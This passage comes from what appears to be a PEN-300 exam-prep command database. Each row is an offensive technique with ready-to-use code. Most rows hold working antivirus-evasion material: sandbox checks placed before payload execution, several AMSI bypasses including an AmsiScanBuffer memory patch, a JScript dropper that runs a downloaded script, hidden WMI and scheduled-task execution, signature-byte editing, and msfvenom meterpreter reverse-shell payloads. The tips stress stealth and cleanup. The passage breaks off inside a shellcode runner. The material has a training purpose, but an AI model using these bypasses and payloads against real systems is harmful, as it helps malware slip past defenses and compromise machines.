    mem = Marshal.AllocHGlobal(<LARGE_SIZE>); // e.g., 100MB
    if(mem == IntPtr.Zero) {
        return; // Allocation failed - sandbox
    }
    Marshal.FreeHGlobal(mem);
} catch {
    return; // Exception - sandbox
}","Detect limited sandbox resources by attempting large memory allocation. Sandboxes often have memory constraints - fail if allocation fails.","","using System;

IntPtr mem = IntPtr.Zero;
try {
    mem = Marshal.AllocHGlobal(100000000); // e.g., 100MB
    if(mem == IntPtr.Zero) {
        return; // Allocation failed - sandbox
    }
    Marshal.FreeHGlobal(mem);
} catch {
    return; // Exception - sandbox
}","Syntax:
Add before payload execution Simple but less reliable than API checks.

Best used as additional layer.

100MB is safe middle ground.

Don't go too large or real systems fail.

Time estimate:
1 minute References:
docs/av-evasion/heuristic-evasion.md#memory-checks Manual alternative:
Use VirtualAlloc with large size, or allocate multiple large arrays","","","","","","","","",""
"check-processor-count","Processor Count Check","heuristic-evasion","using System;

int cores = Environment.ProcessorCount;
if(cores < <MIN_CORES>) {
    return; // Sandbox detected
}","Detect VM/sandbox by checking CPU core count. Sandboxes typically have 1-2 cores. Real systems usually have 4+. Simple environmental check.","","using System;

int cores = Environment.ProcessorCount;
if(cores < 2) {
    return; // Sandbox detected
}","Syntax:
Add at start of Main() Very simple check, takes 1 line.

Not foolproof but adds friction.

Use 2 cores as threshold for broader compatibility.

Combine with API checks.

Time estimate:
30 seconds References:
docs/av-evasion/heuristic-evasion.md#environment-checks Manual alternative:
Check RAM size, disk size, screen resolution, or installed programs","","","","","","","","",""
"check-username-environment","Username/Hostname Check","heuristic-evasion","using System;

string username = Environment.UserName.ToLower();
string hostname = Environment.MachineName.ToLower();

string[] suspiciousNames = { ""sandbox"", ""malware"", ""virus"", ""analysis"", ""sample"", ""test"" };

foreach(string name in suspiciousNames) {
    if(username.Contains(name) || hostname.Contains(name)) {
        return; // Sandbox detected
    }
}","Detect sandbox by checking for common analysis usernames/hostnames (sandbox, malware, virus, analysis, etc.). Simple string matching.","","","Syntax:
Add at start of Main() Low-hanging fruit.

Easy to bypass but catches lazy sandboxes.

Add common virtualization terms (vmware, vbox, qemu).

Not reliable for exam but quick to add.

Time estimate:
2 minutes References:
docs/av-evasion/heuristic-evasion.md#environment-checks Manual alternative:
Check for specific sandbox artifacts (files, registry keys, processes), or known MAC address ranges","","","","","","","","",""
"check-recent-files","Recent Files Check","heuristic-evasion","using System;
using System.IO;

string recentPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
int fileCount = Directory.GetFiles(recentPath).Length;

if(fileCount < <MIN_FILES>) {
    return; // Fresh sandbox detected
}","Detect fresh sandbox by checking if user has recent files/documents. Real systems have user activity artifacts. Fresh sandboxes typically have empty recent files.","","using System;
using System.IO;

string recentPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
int fileCount = Directory.GetFiles(recentPath).Length;

if(fileCount < 5) {
    return; // Fresh sandbox detected
}","Syntax:
Add before payload execution Clever check that's hard to fake realistically.

Real systems accumulate artifacts over time.

5 files is safe threshold.

Good for targeted attacks where you know environment.

Time estimate:
2 minutes References:
docs/av-evasion/heuristic-evasion.md#artifact-checks Manual alternative:
Check browser history, cookie count, installed programs, or Windows event log size","","","","","","","","",""
"check-uptime","System Uptime Check","heuristic-evasion","using System;

int uptimeMS = Environment.TickCount;
int uptimeMinutes = uptimeMS / 60000;

if(uptimeMinutes < <MIN_UPTIME_MINUTES>) {
    return; // Fresh sandbox detected
}","Detect fresh sandbox by checking system uptime. Fresh analysis environments typically have very short uptime (<10 minutes). Real systems usually have hours/days uptime.","","using System;

int uptimeMS = Environment.TickCount;
int uptimeMinutes = uptimeMS / 60000;

if(uptimeMinutes < 10) {
    return; // Fresh sandbox detected
}","Syntax:
Add at start of Main() Effective against automated analysis.

10 minutes is safe threshold (most analysis completes in 5 min).

Don't use values >30 min to avoid false positives on legitimate reboots.

Time estimate:
1 minute References:
docs/av-evasion/heuristic-evasion.md#uptime-checks Manual alternative:
Check last boot time via WMI, or check process start times for long-running system processes","","","","","","","","",""
"amsi-context-corruption","AMSI Context Corruption (Reflection)","amsi-bypass","[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'}|%{[IntPtr]$ptr=$_.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes(0),0,$ptr,4)}}","Overwrite AMSI context structure header via .NET Reflection to force E_INVALIDARG errors. Most reliable method on older Windows 10 builds.","","","Syntax:
Paste directly into PowerShell session before executing AMSI-flagged code Test multiple bypass methods in lab before exam.

Context corruption works on most Windows 10 1809-1909 builds.

Always have backup method ready.

Time estimate:
30 seconds References:
docs/av-evasion/amsi-bypass.md#context-corruption, PEN-300 Chapter 7.3.1 Manual alternative:
Use obfuscation techniques, execute from non-AMSI context (cmd.exe -> powershell -EncodedCommand), or use alternate scripting languages (Python, compiled binaries)","","","","","","","","",""
"amsi-init-failed","AMSI Initialization Bypass","amsi-bypass","[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*InitFailed'}|%{$_.SetValue($null,$true)}}","Set amsiInitFailed flag to prevent AMSI initialization checks. Simpler than context corruption but may be detected by behavioral monitoring.","","","Syntax:
Execute before AMSI-flagged operations Faster than context corruption but potentially less reliable.

Good for quick tests.

Combine with obfuscation for better results.

Time estimate:
15 seconds References:
docs/av-evasion/amsi-bypass.md#initialization-bypass, PEN-300 Chapter 7.3.2 Manual alternative:
Use PowerShell constrained language mode bypass, alternate execution contexts (runspaces), or compiled .NET assemblies","","","","","","","","",""
"amsi-memory-patch","AMSI Memory Patching (AmsiScanBuffer)","amsi-bypass","$Win32=@""
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(""kernel32"")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport(""kernel32"")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport(""kernel32"")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
""@
Add-Type $Win32
$lib=[Win32]::LoadLibrary(""amsi.dll"")
$addr=[Win32]::GetProcAddress($lib,""AmsiScanBuffer"")
$p=0
[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)
$patch=[Byte[]](0x48,0x31,0xC0,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,4)","Patch AmsiScanBuffer function in memory to always return clean result. Most reliable method but requires more code. Patches with 'XOR RAX,RAX; RET' to force AMSI_RESULT_CLEAN.","","","Syntax:
Execute complete script in PowerShell session Most reliable across Windows versions.

Works even when other methods are patched.

Takes 1-2 minutes to type if needed.

Save as .ps1 file for quick deployment.

Time estimate:
2 minutes (manual typing) or 10 seconds (pre-staged file) References:
docs/av-evasion/amsi-bypass.md#memory-patching, PEN-300 Chapter 7.4 Manual alternative:
Use DLL injection, process hollowing, or execute payloads from unmanaged memory contexts (C/C++ loaders)","","","","","","","","",""
"amsi-test-payload","AMSI Test Payload","amsi-bypass","'Invoke-Mimikatz'","Known AMSI-flagged string for testing bypass effectiveness. If this executes without error, AMSI is successfully bypassed.","","","Syntax:
Execute after bypass attempt Always test bypass before executing real payload.

'Invoke-Mimikatz', 'amsiutils', 'AmsiScanBuffer' are reliable test strings.

Save time by testing early.

Time estimate:
5 seconds References:
docs/av-evasion/amsi-bypass.md#testing Manual alternative:
Use VirusTotal or local Defender scan to validate if payload is flagged","","","","","","","","",""
"amsi-base64-staging","Base64 AMSI Bypass Staging","amsi-bypass","powershell -EncodedCommand <BASE64_BYPASS>","Encode AMSI bypass in Base64 for command-line execution or evasion of string-based detections. Useful for initial access payloads.","","powershell -EncodedCommand W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp","Syntax:
Generate Base64 encoded bypass command Useful for phishing payloads, macro delivery, or any scenario where command-line arguments are exposed.

Pre-generate and test before exam.

Time estimate:
1 minute References:
docs/av-evasion/amsi-bypass.md#obfuscation Manual alternative:
Use alternate encodings (hex, compression), or deliver via encrypted channels (SSL/TLS)","","","","","","","","",""
"amsi-jscript-registry","AMSI Bypass for JScript (Registry)","amsi-bypass","var sh = new ActiveXObject(""WScript.Shell"");
var key = ""HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"";
try {
    var val = sh.RegRead(key);
    if(val != 0) {
        sh.RegWrite(key, 0, ""REG_DWORD"");
    }
} catch(e) {
    sh.RegWrite(key, 0, ""REG_DWORD"");
}
WScript.Echo(""AMSI disabled for WSH"");","Disable AMSI for JScript/VBScript by setting AmsiEnable registry value to 0. Requires user-level registry access (HKCU).","","","Syntax:
Add to .js file before malicious operations Useful for Office macro chains (VBA -> WScript -> JScript -> Payload).

Persistent across reboots until key is removed.

Clean up for stealth.

Time estimate:
30 seconds References:
docs/av-evasion/amsi-bypass.md#jscript-bypass, PEN-300 Chapter 7.6 Manual alternative:
Execute JScript from non-AMSI context, use COM objects instead of WScript, or compile to executable with JScript.NET","","","","","","","","",""
"jscript-amsi-registry-bypass","JScript AMSI Registry Bypass","jscript-evasion","var sh = new ActiveXObject(""WScript.Shell"");
var key = ""HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"";
try {
    var val = sh.RegRead(key);
    if(val != 0) {
        sh.RegWrite(key, 0, ""REG_DWORD"");
    }
} catch(e) {
    sh.RegWrite(key, 0, ""REG_DWORD"");
}
WScript.Echo(""AMSI disabled for WSH"");","Disable AMSI for JScript/VBScript by setting AmsiEnable registry value to 0. Requires user-level registry access (HKCU). Persists until key removed.","","","Syntax:
Save as .js file, execute with wscript.exe or cscript.exe Useful for VBA -> JScript attack chains.

Persistent (survives reboot) - good and bad.

Remember to clean up.

See also:
amsi-jscript-registry in amsi-bypass module.

Time estimate:
2 minutes References:
docs/av-evasion/jscript-evasion.md#amsi-registry-bypass, amsi-bypass.json#amsi-jscript-registry, PEN-300 Chapter 7.6.2 Manual alternative:
Execute JScript from non-AMSI context, use COM objects, or compile to .exe with JScript.NET","","","","","","","","",""
"jscript-self-modifying-exe","JScript Self-Modifying Executable","jscript-evasion","// Part 1: JScript dropper (beginning of .js file)
var fso = new ActiveXObject(""Scripting.FileSystemObject"");
var sh = new ActiveXObject(""WScript.Shell"");

// Read own file
var scriptPath = WScript.ScriptFullName;
var file = fso.OpenTextFile(scriptPath, 1);
var content = file.ReadAll();
file.Close();

// Extract payload after marker
var marker = ""###PAYLOAD###"";
var payloadStart = content.indexOf(marker) + marker.length;
var payload = content.substring(payloadStart);

// Write payload to temp file
var tempPath = sh.ExpandEnvironmentStrings(""%TEMP%"") + ""\\<OUTPUT_FILE>"";
var outFile = fso.CreateTextFile(tempPath, true);
outFile.Write(payload);
outFile.Close();

// Execute payload
sh.Run(tempPath, 0);

// Part 2: Embedded payload (after JScript code)
WScript.Quit();
###PAYLOAD###
<EMBEDDED_PAYLOAD_CONTENT>","Concatenate JScript dropper with embedded payload into single executable. WSH script reads own file, extracts embedded payload, writes to disk and executes. Evades initial AMSI scan.","","// Part 1: JScript dropper (beginning of .js file)
var fso = new ActiveXObject(""Scripting.FileSystemObject"");
var sh = new ActiveXObject(""WScript.Shell"");

// Read own file
var scriptPath = WScript.ScriptFullName;
var file = fso.OpenTextFile(scriptPath, 1);
var content = file.ReadAll();
file.Close();

// Extract payload after marker
var marker = ""###PAYLOAD###"";
var payloadStart = content.indexOf(marker) + marker.length;
var payload = content.substring(payloadStart);

// Write payload to temp file
var tempPath = sh.ExpandEnvironmentStrings(""%TEMP%"") + ""\\payload.ps1"";
var outFile = fso.CreateTextFile(tempPath, true);
outFile.Write(payload);
outFile.Close();

// Execute payload
sh.Run(tempPath, 0);

// Part 2: Embedded payload (after JScript code)
WScript.Quit();
###PAYLOAD###
IEX (New-Object Net.WebClient).DownloadString('http://...')","Syntax:
Create JScript dropper, append payload after marker, save as .js Creative evasion technique.

Initial scan sees benign dropper.

Payload extracted at runtime.

Good for embedding PowerShell scripts or small executables.

Test marker uniqueness.

~20 min to implement.

Time estimate:
20 minutes References:
docs/av-evasion/jscript-evasion.md#self-modifying, PEN-300 Chapter 7.6.3 Manual alternative:
Use HTTP download instead of embedding, encrypted payload sections, or multi-stage loaders","","","","","","","","",""
"jscript-wsh-obfuscation","JScript String Obfuscation","jscript-evasion","// Method 1: String.fromCharCode()
var cmd = String.fromCharCode(112,111,119,101,114,115,104,101,108,108); // ""powershell""

// Method 2: String concatenation
var cmd = ""pow"" + ""er"" + ""shell.exe"";

// Method 3: Array join
var parts = [""pow"", ""er"", ""shell""];
var cmd = parts.join("""") + "".exe"";

// Method 4: Base64 decode (custom function)
function b64decode(str) {
    var b64 = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="";
    var decoded = """";
    // Decode implementation...
    return decoded;
}
var cmd = b64decode(""cG93ZXJzaGVsbC5leGU="");","Obfuscate suspicious strings in JScript using various encoding techniques. Evades simple string-based signatures.","","","Syntax:
Apply to suspicious strings in JScript code Quick win for JScript payloads.

Always obfuscate 'powershell', 'cmd', 'http', 'eval'.

Use random variable names.

String.fromCharCode() most effective.

~10 min to apply.

Time estimate:
10 minutes References:
docs/av-evasion/jscript-evasion.md#obfuscation Manual alternative:
Use eval() with encoded strings, external config files, or hex encoding","","","","","","","","",""
"jscript-com-execution","JScript COM Object Execution","jscript-evasion","// Method 1: WMI Process Creation
var wmi = GetObject(""winmgmts:\\\\.\\root\\cimv2"");
var startup = wmi.Get(""Win32_ProcessStartup"").SpawnInstance_();
startup.ShowWindow = 0; // Hidden
var process = wmi.Get(""Win32_Process"");
var pid = {};
process.Create(""<COMMAND>"", null, startup, pid);

// Method 2: Task Scheduler
var schedule = new ActiveXObject(""Schedule.Service"");
schedule.Connect();
var rootFolder = schedule.GetFolder(""\\"");
var taskDef = schedule.NewTask(0);
var action = taskDef.Actions.Create(0); // Execute
action.Path = ""<COMMAND>"";
rootFolder.RegisterTaskDefinition(""<TASK_NAME>"", taskDef, 6, null, null, 3);","Execute commands via COM objects instead of direct Shell.Run(). Uses WMI, Task Scheduler, or other COM interfaces to break behavioral patterns.","","// Method 1: WMI Process Creation
var wmi = GetObject(""winmgmts:\\\\.\\root\\cimv2"");
var startup = wmi.Get(""Win32_ProcessStartup"").SpawnInstance_();
startup.ShowWindow = 0; // Hidden
var process = wmi.Get(""Win32_Process"");
var pid = {};
process.Create(""powershell.exe -nop -w hidden -c ..."", null, startup, pid);

// Method 2: Task Scheduler
var schedule = new ActiveXObject(""Schedule.Service"");
schedule.Connect();
var rootFolder = schedule.GetFolder(""\\"");
var taskDef = schedule.NewTask(0);
var action = taskDef.Actions.Create(0); // Execute
action.Path = ""powershell.exe -nop -w hidden -c ..."";
rootFolder.RegisterTaskDefinition(""WindowsUpdate"", taskDef, 6, null, null, 3);","Syntax:
Replace <COMMAND> with payload command COM execution breaks simple parent-child monitoring.

WMI method more reliable than Task Scheduler.

Clean up tasks after execution.

Good for persistence too.

~15 min to implement.

Time estimate:
15 minutes References:
docs/av-evasion/jscript-evasion.md#com-execution Manual alternative:
Use WScript.Shell.Exec(), CreateObject(""Shell.Application"").ShellExecute(), or MMC20.Application COM object","","","","","","","","",""
"wscript-cscript-execution","WScript vs CScript Execution","jscript-evasion","# Execute with WScript (GUI mode, hidden)
wscript.exe //B //Nologo <SCRIPT_FILE>

# Execute with CScript (console mode)
cscript.exe //B //Nologo <SCRIPT_FILE>

# Force hidden execution (WScript)
wscript.exe //B //Nologo <SCRIPT_FILE>

# Within script, check execution mode:
var isConsole = (WScript.FullName.toLowerCase().indexOf(""cscript"") != -1);","Choose between WScript.exe (GUI) and CScript.exe (console) for JScript/VBScript execution. CScript better for stealth (no windows), WScript better for hidden execution.","","# Execute with WScript (GUI mode, hidden)
wscript.exe //B //Nologo payload.js

# Execute with CScript (console mode)
cscript.exe //B //Nologo payload.js

# Force hidden execution (WScript)
wscript.exe //B //Nologo payload.js

# Within script, check execution mode:
var isConsole = (WScript.FullName.toLowerCase().indexOf(""cscript"") != -1);","Syntax:
Execute from command line or within script WScript for GUI-less execution from shortcuts/scheduled tasks.

CScript for command-line integration.

Always use //B //Nologo for stealth.

Test both modes - different behavioral signatures.

Time estimate:
2 minutes References:
docs/av-evasion/jscript-evasion.md#execution-modes Manual alternative:
Use PowerShell Invoke-Expression, direct COM object instantiation, or mshta.exe for HTA execution","","","","","","","","",""
"windbg-attach-process","WinDbg Attach to Process","debugging","# Launch WinDbg (x64) and attach:
# File -> Attach to Process -> Select process -> OK

# Or via command line:
windbg.exe -p <PID>

# Common processes to debug:
# - powershell.exe (AMSI analysis)
# - cscript.exe / wscript.exe (JScript AMSI)
# - WINWORD.EXE (VBA analysis)","Attach WinDbg debugger to running process for live analysis. Essential for analyzing AMSI.DLL loading, function hooking, and runtime behavior.","","# Launch WinDbg (x64) and attach:
# File -> Attach to Process -> Select process -> OK

# Or via command line:
windbg.exe -p 1234

# Common processes to debug:
# - powershell.exe (AMSI analysis)
# - cscript.exe / wscript.exe (JScript AMSI)
# - WINWORD.EXE (VBA analysis)","Syntax:
Launch WinDbg, attach to target process WinDbg essential for understanding AMSI internals.

Attach to PowerShell to analyze AmsiScanBuffer.

Use sparingly in OSCP (time-consuming).

Good for lab research before exam.

~5 min setup time.

Time estimate:
5 minutes (first-time setup) References:
docs/av-evasion/debugging.md#windbg-basics, PEN-300 Chapter 7.1.1 Manual alternative:
Use x64dbg, OllyDbg (32-bit), or Visual Studio debugger","","","","","","","","",""
"windbg-breakpoint-commands","WinDbg Breakpoint Commands","debugging","# Set breakpoint on function
bp <MODULE>!<FUNCTION>

# Common AMSI breakpoints:
bp amsi!AmsiInitialize
bp amsi!AmsiOpenSession
bp amsi!AmsiScanBuffer
bp amsi!AmsiCloseSession

# Continue execution
g

# Step execution
p  # Step over
t  # Step into

# List breakpoints
bl

# Clear breakpoint
bc <BREAKPOINT_NUMBER>","Set breakpoints on functions to intercept execution. Critical for analyzing AMSI function flow (AmsiInitialize, AmsiScanBuffer, etc.).","","# Set breakpoint on function
bp amsi!AmsiScanBuffer

# Common AMSI breakpoints:
bp amsi!AmsiInitialize
bp amsi!AmsiOpenSession
bp amsi!AmsiScanBuffer
bp amsi!AmsiCloseSession

# Continue execution
g

# Step execution
p  # Step over
t  # Step into

# List breakpoints
bl

# Clear breakpoint
bc 0","Syntax:
Execute in WinDbg command window Breakpoints critical for AMSI research.

AmsiScanBuffer most important (called on every script scan).

Practice setting bp before exam.

Takes 1-2 min per breakpoint.

Time estimate:
2 minutes per breakpoint References:
docs/av-evasion/debugging.md#breakpoints, PEN-300 Chapter 7.1.1 Manual alternative:
Use x64dbg GUI, hardware breakpoints (ba command), or memory breakpoints","","","","","","","","",""
"windbg-memory-inspection","WinDbg Memory Inspection","debugging","# Display memory as DWORD (32-bit values)
dd <ADDRESS>

# Display memory as QWORD (64-bit values)
dq <ADDRESS>

# Display memory as ASCII string
dc <ADDRESS>

# Display memory as Unicode string
du <ADDRESS>

# Display memory as bytes
db <ADDRESS>

# Display specific number of values
dd <ADDRESS> L<COUNT>","Inspect memory contents at specific addresses. Essential for viewing AMSI context structures, shellcode buffers, and function parameters.","","# Display memory as DWORD (32-bit values)
dd rsp

# Display memory as QWORD (64-bit values)
dq rsp

# Display memory as ASCII string
dc rsp

# Display memory as Unicode string
du rsp

# Display memory as bytes
db rsp

# Display specific number of values
dd rsp L10","Syntax:
Execute in WinDbg after breaking at function Memory inspection reveals AMSI context structure (first 4 bytes:
""AMSI"").

Critical for understanding context corruption bypass.

Use 'du' for PowerShell strings (Unicode).

~1 min per inspection.

Time estimate:
1 minute References:
docs/av-evasion/debugging.md#memory-inspection, PEN-300 Chapter 7.2 Manual alternative:
Use Process Explorer memory viewer, x64dbg memory map, or CheatEngine","","","","","","","","",""
"windbg-disassemble","WinDbg Disassembly View","debugging","# Unassemble at current instruction pointer
u

# Unassemble specific address or function
u <ADDRESS>
u <MODULE>!<FUNCTION>

# Unassemble with length
u <ADDRESS> L<COUNT>

# Unassemble current function
uf .

# Unassemble specific function (full)
uf <MODULE>!<FUNCTION>","Disassemble machine code to assembly instructions. Shows function internals, allows understanding of AMSI validation logic and bypass opportunities.","","# Unassemble at current instruction pointer
u

# Unassemble specific address or function
u rip
u amsi!AmsiScanBuffer

# Unassemble with length
u rip L20

# Unassemble current function
uf .

# Unassemble specific function (full)
uf amsi!AmsiScanBuffer","Syntax:
Execute in WinDbg Understanding AmsiScanBuffer disassembly shows WHERE to patch for memory bypass.

Look for 'test', 'cmp', 'je' instructions (validation logic).

'xor rax, rax; ret' = clean return.

~10 min to analyze function.

Time estimate:
10 minutes (function analysis) References:
docs/av-evasion/debugging.md#disassembly, PEN-300 Chapter 7.4.1 Manual alternative:
Use IDA Pro, Ghidra, Binary Ninja, or x64dbg for static analysis","","","","","","","","",""
"frida-trace-amsi","Frida Trace AMSI Functions","debugging","# List running processes
frida-ps

# Trace AMSI functions in PowerShell process
frida-trace -p <PID> -x amsi.dll -i Amsi*

# Trace with detailed logging
frida-trace -p <PID> -x amsi.dll -i AmsiScanBuffer -i AmsiInitialize","Use Frida dynamic instrumentation to trace AMSI API calls. Non-invasive alternative to WinDbg for analyzing AMSI behavior without debugging.","","# List running processes
frida-ps

# Trace AMSI functions in PowerShell process
frida-trace -p 5432 -x amsi.dll -i Amsi*

# Trace with detailed logging
frida-trace -p 5432 -x amsi.dll -i AmsiScanBuffer -i AmsiInitialize","Syntax:
Execute from Kali or Windows with Frida installed Frida is powerful but may be blocked by AV/EDR.

Good for lab analysis before exam.

Shows WHAT PowerShell sends to AMSI for scanning.

Custom handlers reveal buffer contents.

~15 min setup first time.

Time estimate:
15 minutes (first-time setup) References:
docs/av-evasion/debugging.md#frida, PEN-300 Chapter 7.2.2 Manual alternative:
Use API Monitor, Process Monitor, or WinDbg for function tracing","","","","","","","","",""
"windbg-edit-memory","WinDbg Edit Memory (Live Patching)","debugging","# Edit memory (DWORD)
ed <ADDRESS> <NEW_VALUE>

# Edit memory (byte)
eb <ADDRESS> <BYTE1> <BYTE2> <BYTE3> ...

# Example: Patch AmsiScanBuffer to return clean
# Find function address:
x amsi!AmsiScanBuffer

# Patch with: xor rax,rax (48 31 C0); ret (C3)
eb <ADDRESS> 48 31 C0 C3","Modify memory at runtime to test patches. Allows live testing of AMSI bypass patches without recompiling code.","","# Edit memory (DWORD)
ed 7ffa12345678 90909090

# Edit memory (byte)
eb 7ffa12345678 48 0x12 0x34 ...

# Example: Patch AmsiScanBuffer to return clean
# Find function address:
x amsi!AmsiScanBuffer

# Patch with: xor rax,rax (48 31 C0); ret (C3)
eb 7ffa12345678 48 31 C0 C3","Syntax:
Execute in WinDbg after breaking Live patching validates bypass techniques before implementing in code.

Patch AmsiScanBuffer with 'xor rax,rax; ret' to test if bypass works.

Reversible (just restart process).

~5 min to test patch.

Time estimate:
5 minutes References:
docs/av-evasion/debugging.md#live-patching, PEN-300 Chapter 7.4.2 Manual alternative:
Use x64dbg patches, Cheat Engine, or process memory writers","","","","","","","","",""
"find-av-signature","Find-AVSignature (Binary Signature Location)","signature-evasion","Import-Module .\Find-AVSignature.ps1
Find-AVSignature -StartByte 0 -EndByte max -Interval <INTERVAL> -Path <TARGET_FILE> -OutPath <OUTPUT_DIR> -Verbose -Force","PowerShell script to locate exact byte offsets flagged by antivirus. Uses binary search (split-and-scan) to narrow down signature location in executable files.","","Import-Module .\Find-AVSignature.ps1
Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\payload.exe -OutPath C:\Tools\avtest -Verbose -Force","Syntax:
Run on Windows with PowerShell, requires Find-AVSignature.ps1 script Time-consuming but precise.

Typical workflow:
100001000100101 byte intervals.

Takes 15-30 minutes per signature.

Practice on known-flagged payloads before exam.

Time estimate:
15-30 minutes per signature References:
docs/av-evasion/signature-evasion.md#find-av-signature, PEN-300 Chapter 6.3 Manual alternative:
Manual binary editing with hex editor (HxD, 010 Editor), or automated tools like ThreatCheck, DefenderCheck","","","","","","","","",""
"modify-signature-bytes","Modify Signature Bytes (PowerShell)","signature-evasion","$bytes = [System.IO.File]::ReadAllBytes('<INPUT_FILE>')
<MODIFICATIONS>
[System.IO.File]::WriteAllBytes('<OUTPUT_FILE>', $bytes)","Overwrite flagged byte offsets in binary file. Replace identified signature bytes with nulls or random values to break AV detection.","","$bytes = [System.IO.File]::ReadAllBytes('C:\Tools\payload.exe')
$bytes[18867] = 0x00
[System.IO.File]::WriteAllBytes('C:\Tools\payload_modified.exe', $bytes)","Syntax:
PowerShell byte modification Only modify bytes identified by Find-AVSignature.

Don't randomly modify - will corrupt exe.

Test modified binary before deploying.

May need multiple iterations.

Time estimate:
5 minutes per modification cycle References:
docs/av-evasion/signature-evasion.md#byte-modification, PEN-300 Chapter 6.3 Manual alternative:
Use hex editor manually (HxD, 010 Editor, Hex Fiend), or automated patching tools","","","","","","","","",""
"msfvenom-encoder-shikata","msfvenom Shikata Ga Nai Encoder (x86)","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i <ITERATIONS> -f exe -o <OUTPUT_FILE>","Polymorphic XOR encoder for x86 payloads. Most well-known msfvenom encoder. Note: Heavily signatured by modern AV - use as baseline, not final solution.","","msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe","Syntax:
Run on Kali Linux Shikata is famous but outdated.

Don't rely on it alone.

Useful as first layer before custom encryption.

Know limitations for exam.

Max 15-20 iterations before diminishing returns.

Time estimate:
1 minute References:
docs/av-evasion/signature-evasion.md#shikata-ga-nai, PEN-300 Chapter 6.4.1 Manual alternative:
Use alternate encoders (zutto_dekiru, xor_dynamic), custom encryption, or obfuscation frameworks","","","","","","","","",""
"msfvenom-encoder-zutto","msfvenom Zutto Dekiru Encoder (x64)","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -e x64/zutto_dekiru -i <ITERATIONS> -f exe -o <OUTPUT_FILE>","Polymorphic encoder for x64 payloads. x64 equivalent of shikata_ga_nai. Better than no encoding but still well-known to AV vendors.","","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x64/zutto_dekiru -i 10 -f exe -o payload64.exe","Syntax:
Run on Kali Linux Use for x64 targets.

Same limitations as shikata.

Must combine with custom encryption or process injection for exam success.

Time estimate:
1 minute References:
docs/av-evasion/signature-evasion.md#zutto-dekiru, PEN-300 Chapter 6.4.1 Manual alternative:
Use custom loaders with AES encryption, process injection, or shellcode encryption","","","","","","","","",""
"msfvenom-encrypt-aes","msfvenom AES256 Encryption","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> --encrypt aes256 --encrypt-key <KEY> -f exe -o <OUTPUT_FILE>","AES256 encryption for msfvenom payloads. Stronger than encoding - payload encrypted with key, decrypted at runtime. Requires key management.","","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 --encrypt aes256 --encrypt-key MySecretKey2024 -f exe -o payload_aes.exe","Syntax:
Run on Kali Linux Better than encoding but msfvenom's built-in decryptor is signatured.

For exam, use custom C# AES decryption for best results.

AES good for understanding concepts.

Time estimate:
1 minute References:
docs/av-evasion/signature-evasion.md#aes-encryption, PEN-300 Chapter 6.4.2 Manual alternative:
Custom AES implementation in C#/Python, XOR with multi-byte keys, or RC4 encryption","","","","","","","","",""
"msfvenom-template-injection","msfvenom Template Injection","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -x <TEMPLATE_EXE> -f exe -o <OUTPUT_FILE>","Inject payload into legitimate Windows executable using -x flag. Payload embedded in target binary, inherits legitimate code's reputation/signature.","","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -x /usr/share/windows-binaries/nc.exe -f exe -o payload_injected.exe","Syntax:
Run on Kali Linux with template executable Template injection can improve trust but doesn't bypass modern AV signatures.

Best used with signed/legitimate binaries.

Test with and without -k flag.

Transfer legitimate Windows binaries to Kali for best templates.

Time estimate:
2 minutes References:
docs/av-evasion/signature-evasion.md#template-injection, PEN-300 Chapter 6.4 Manual alternative:
Manual PE injection with tools like CFF Explorer, PE-Bear, or custom Python scripts","","","","","","","","",""
"clamscan-test","ClamAV Signature Test","signature-evasion","cd 'C:\Program Files\ClamAV\'
.\clamscan.exe <TARGET_FILE>","Test binary against ClamAV signatures locally. Fast offline AV testing without uploading to VirusTotal. Useful for iterative testing during signature evasion.","","cd 'C:\Program Files\ClamAV\'
.\clamscan.exe C:\Tools\payload.exe","Syntax:
Run on Windows with ClamAV installed ClamAV is free baseline test.

Not comprehensive (misses many commercial signatures) but useful for rapid iteration.

Don't rely solely on ClamAV - test with Defender or Avira too.

Time estimate:
30 seconds per scan References:
docs/av-evasion/signature-evasion.md#testing, PEN-300 Chapter 6.2 Manual alternative:
Use online scanners (AntiScan.Me - doesn't distribute), VirusTotal (distributes to vendors), or Windows Defender locally","","","","","","","","",""
"csharp-shellcode-runner-basic","C# Shellcode Runner (Basic)","shellcode-runners","using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner {
    class Program {
        [DllImport(""kernel32"")]
